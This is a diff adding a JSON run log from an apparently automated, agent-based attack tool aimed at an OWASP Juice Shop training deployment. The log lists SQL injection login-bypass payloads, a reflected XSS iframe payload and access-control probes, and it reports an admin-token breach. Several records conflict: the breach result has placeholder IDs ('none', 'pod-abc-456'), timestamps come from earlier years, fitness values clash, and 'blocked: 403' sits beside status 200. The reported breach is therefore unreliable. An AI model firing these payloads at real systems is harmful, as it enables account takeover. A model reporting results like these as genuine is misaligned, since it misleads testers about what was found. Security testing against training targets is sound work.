@@ -1,0 +1,198 @@
+{
+  "run_id": "r1779571821",
+  "target_url": "https://juice-shop-production-d0c5.up.railway.app",
+  "started_at": "2026-05-23T21:30:21Z",
+  "finished_at": "2026-05-23T21:31:50Z",
+  "duration_s": 88.609777999,
+  "generations_run": 1,
+  "total_pods": 5,
+  "outcome": "BREACH",
+  "best_fitness": 1,
+  "breach": {
+    "pod_id": "r1779571821-g1-p1",
+    "generation": 1,
+    "vector": "sqli_login_union",
+    "category": "injection",
+    "evidence": "admin token returned via SQL bypass",
+    "raw_findings": [
+      {
+        "method": "POST",
+        "snippet": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+        "status_code": 200,
+        "url": "https://juice-shop-production-d0c5.up.railway.app/rest/user/login"
+      }
+    ]
+  },
+  "per_generation": [
+    {
+      "generation": 1,
+      "population": 5,
+      "survivors": 2,
+      "best_fitness": 1,
+      "breaches": 1,
+      "per_pod": [
+        {
+          "Genome": {
+            "vector": "sqli_login",
+            "category": "injection",
+            "technique": "tautology",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' OR 1=1--",
+              "password": "x"
+            },
+            "hint": "Try classic auth bypass via SQL tautology in email field."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779571821",
+            "pod_id": "r1779571821-g1-p0",
+            "generation": 1,
+            "vector": "sqli_login",
+            "category": "injection",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 63000,
+            "t": 1779571884017
+          },
+          "Fitness": 0,
+          "PodID": "r1779571821-g1-p0"
+        },
+        {
+          "Genome": {
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "technique": "union_select",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' UNION SELECT 1,2,3,4,5--"
+            },
+            "hint": "Try UNION-based info leak."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "none",
+            "pod_id": "none",
+            "generation": 1,
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "status": "BREACH",
+            "fitness": 1,
+            "evidence": "admin token returned via SQL bypass",
+            "raw_findings": [
+              {
+                "method": "POST",
+                "snippet": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+                "status_code": 200,
+                "url": "https://juice-shop-production-d0c5.up.railway.app/rest/user/login"
+              }
+            ],
+            "duration_ms": 15000,
+            "t": 1753314675000
+          },
+          "Fitness": 1,
+          "PodID": "r1779571821-g1-p1"
+        },
+        {
+          "Genome": {
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "technique": "reflected",
+            "target_path": "/#/search",
+            "params": {
+              "q": "\u003ciframe src=javascript:alert(1)\u003e"
+            },
+            "hint": "Try reflected XSS via search query parameter."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779571821",
+            "pod_id": "r1779571821-g1-p2",
+            "generation": 1,
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi finished without emitting a result line",
+            "raw_findings": [],
+            "duration_ms": 52000,
+            "t": 1779571874401
+          },
+          "Fitness": 0,
+          "PodID": "r1779571821-g1-p2"
+        },
+        {
+          "Genome": {
+            "vector": "bola_users",
+            "category": "access_control",
+            "technique": "id_enumeration",
+            "target_path": "/api/Users/1",
+            "params": {},
+            "hint": "Try fetching admin user by ID without auth."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "openzerg-run-123",
+            "pod_id": "pod-abc-456",
+            "generation": 1,
+            "vector": "bola_users",
+            "category": "access_control",
+            "status": "RECON",
+            "fitness": 0.5,
+            "evidence": "endpoint exists, 401/403 returned",
+            "raw_findings": [
+              {
+                "method": "GET",
+                "snippet": "UnauthorizedError: No Authorization header was found",
+                "status_code": 401,
+                "url": "https://juice-shop-production-d0c5.up.railway.app/api/Users/1"
+              }
+            ],
+            "duration_ms": 1500,
+            "t": 1716456000000
+          },
+          "Fitness": 0.4,
+          "PodID": "r1779571821-g1-p3"
+        },
+        {
+          "Genome": {
+            "vector": "admin_section",
+            "category": "access_control",
+            "technique": "force_browse",
+            "target_path": "/#/administration",
+            "params": {},
+            "hint": "Try to reach admin UI directly.",
+            "requires_nimble": true
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "openzerg-probe-12345",
+            "pod_id": "pod-67890",
+            "generation": 1,
+            "vector": "admin_section",
+            "category": "access_control",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "blocked: 403",
+            "raw_findings": [
+              {
+                "method": "GET",
+                "snippet": "... OWASP Juice Shop 0 placeholder 403",
+                "status_code": 200,
+                "url": "https://juice-shop-production-d0c5.up.railway.app/#/administration",
+                "used_nimble": true
+              }
+            ],
+            "duration_ms": 1500,
+            "t": 1716456000000
+          },
+          "Fitness": 0.1,
+          "PodID": "r1779571821-g1-p4"
+        }
+      ]
+    }
+  ],
+  "narrative_md_path": "out/summary-r1779571821.md"
+}
